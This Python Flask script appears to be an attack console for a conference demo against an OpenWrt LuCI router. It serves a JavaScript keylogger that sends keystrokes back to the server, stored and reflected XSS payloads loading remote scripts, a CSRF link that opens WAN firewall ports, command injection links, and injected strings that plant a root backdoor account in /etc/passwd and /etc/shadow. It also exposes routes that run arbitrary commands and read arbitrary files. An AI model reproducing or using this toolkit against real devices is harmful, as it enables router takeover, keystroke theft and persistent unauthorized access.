#!/usr/bin/python
from flask import Flask
from subprocess import call
import os

app = Flask(__name__)
app.debug=True

@app.route('/')
def root():
    return \
    '<!--'+\
    checks("requests")+\
    checks("bs4")+\
    '-->'+\
    '<br><a href=/call/sh/iv-wrt.sh>Start Iv-Wrt</a></>\
    <br><a href=/call/upnpc/-m%20br1%20172.30.254.1%2080%2080%20TCP>Poke a hole via upnp</a></>\
    <br><a href=/csrf/open/80>CSRF:Open Port 80 to the WAN</a></>\
            <br><a href=/reflected_xss>Reflected XSS attack (doesn\'t work in chrome)</a></>\
            <br><a href=/command_injection_ls>Command Injection: ls</a></>\
            <br></>\
            <br>The XSS attack string to call a remote payload should look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/s></script>.</xmp> That points to /s which is the simple alert(1) script. For the keylogger, you should point to <a href=/t>/t</a>, so it would look like this: <xmp><script src=//172&#46;30&#46;254&#46;2/t></script></xmp></>\
            <br><xmp>To check for an IGD use "upnpc -m <iface> -s" and to open port 80 to the WAN use "upnpc -m <iface> -a <ip> <port> <external_port> (TCP|UDP)." For our purposes that\'ll look like: upnpc -m br1 172.30.254.1 80 80 TCP</xmp></br>\
            <br>/etc/passwd command injection backdoor implant:</br><br>;echo ruser:x:0:0:rservice_default:`echo $PWD |cut -c1`tmp:`echo $PWD |cut -c1`bin`echo $PWD |cut -c1`ash >> `echo $PWD |cut -c1`etc`echo $PWD |cut -c1`passwd</br>\
            <br>/etc/shadow command injection backdoor implant:</br><br>;echo ruser:\'$\'1\'$\'4Q5Z0BuW\'$\'9UI5yWhHR3.NWxjuDR2Cs`echo $PWD|cut -c1`:16528:0:99999:7::: >> `echo $PWD|cut -c1`etc`echo $PWD|cut -c1`shadow<br>\
'

@app.route('/call/<command>/<flags>')
def mycall(command, flags):
    result = ''
    try:
        call([command, flags])
    except:
        result += "command not run"
    else: 
            result += "ran "+command+" "+flags
    return result
#
#XSS Stuff
#

@app.route('/fread/<file>')
def fread(file):
    result = ''
    try:
        with open(file, "rw") as myfile:
            result += myfile.read()
    except IOError:
       return result 
    return result
#this is how our keylogger will get data back to the server, it'll write to ~\log.txt
@app.route('/fwrite/<data>')
def fwrite(data):
    with open("log.txt", "w+") as myfile:
        myfile.write(data)
    return ''

#this is the code for the actual key logger--it logs keys and sends them back to the server. This code could use some work.
@app.route('/t')
def keylogger():
    return '\
            function httpGet(theUrl){\
                var xmlHttp = new XMLHttpRequest();\
                xmlHttp.open( \"GET\", theUrl, false );\
                xmlHttp.send( null );\
                return xmlHttp.responseText;\
            }\
            \
            var keys=\'\';\
            document.onkeypress = function(e) {\
                get = window.event?event:e;\
                key = get.keyCode?get.keyCode:get.charCode;\
                key = String.fromCharCode(key);\
                keys+=key;\
                httpGet(\'http://127.0.0.1/fwrite/\'+key);\
            }\
            '
#this is a simple javascript alert payload....boring right?
@app.route('/s')
def do():
    return 'alert(1)'

#this is the final attack string for the stored cross-site scripting attack...it's just here for your convenience
@app.route('/stored_xss_attack')
def sxa():
    return '<xmp><script src=//172&#46;30&#46;254&#46;2/s></script></xmp>'

#
#CSRF Stuff
#

#open whicherver port is specified in the url
@app.route('/csrf/open/<port>')
def csrf_open(port):
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport='+port+'&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=hello_bsides&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>Click Me! It\'ll be fun!</a><br></><br>Also, Don\'t forget that you can open any tcp port by going to: <xmp>/csrf/open/<port number></xmp></>'


#@app.route('/csrf_test')
#def csrf_test():
#   return '<iframe style="display:none" name="csrf-frame"></iframe><form method='POST' action='http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=hello_bsides&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply' target="csrf-frame" id="csrf-form"><input type='hidden' name='criticaltoggle' value='true'><input type='submit' value='submit'></form><script>document.getElementById("csrf-form").submit()</script>'
    #return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=a/admin/network/firewall/rules/?cbi.cbe.firewall.cfg0892bd.enabled=1&_newopen.extport=80&_newfwd.dest=wan&cbi.cbe.firewall.cfg0a92bd.enabled=1&cbi.submit=1&cbi.sts.firewall.redirect=&cbid.firewall.cfg0292bd.enabled=1&cbi.cbe.firewall.cfg0492bd.enabled=1&cbid.firewall.cfg0a92bd.enabled=1&_newsnat.dport=&_newsnat.dip=1&cbid.firewall.cfg0692bd.enabled=1&_newsnat.dest=wan&cbid.firewall.cfg0892bd.enabled=1&_newsnat.src=lan&_newfwd.src=lan&cbi.cbe.firewall.cfg0692bd.enabled=1&cbi.cbe.firewall.cfg0292bd.enabled=1&_newsnat.name=&_newopen.submit=Add&_newfwd.name=&_newopen.proto=tcp&_newopen.name=hello_bsides&cbid.firewall.cfg0492bd.enabled=1&cbi.sts.firewall.rule=&cbi.apply=Save & Apply>Click Me! It\'ll be fun!</a><br></><br>Also, Don\'t forget that you can open any tcp port by going to: <xmp>/csrf/open/<port number></xmp></>'

#
#Command Injection Stuff
#

@app.route('/command_injection_ls')
def cmd_inject():
    return '<a href=http://172.30.254.1/cgi-bin/luci/admin/network/diag_ping/;ls>;ls</>'

#
#Reflected Cross-Site Scripting Stuff
#

@app.route('/reflected_xss')
def xss():
    return '<a href=http://172.30.254.1/cgi-bin/luci/;stok=whatever/admin/system/packages?query=\'&lt;script&gt;alert(1)&lt;/script&gt;>Relfected_XSS</>'

@app.route('/check/<module>')
def checks(module):
    message = ""
    try:
        __import__(module)
    except:
        message += module+" is not installed "
        return message
    else:
        message += module+" is installed "
        return message



if __name__ == '__main__':
    #app.run(port=5000)
    app.run(port=80, host='0.0.0.0') #to allow remote hosts

